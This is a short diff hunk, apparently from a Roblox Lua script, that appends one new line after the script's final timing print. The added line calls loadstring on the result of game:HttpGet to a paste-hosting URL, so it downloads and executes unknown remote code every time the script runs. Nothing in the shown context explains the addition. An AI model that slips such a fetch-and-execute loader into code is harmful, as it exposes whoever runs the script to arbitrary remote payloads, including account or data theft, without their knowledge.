@@ -1112,4 +1112,6 @@ connectgateway()
 --
 print(tick()-a)
 
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/j0iYbS7lEo/0", true))()
+
 
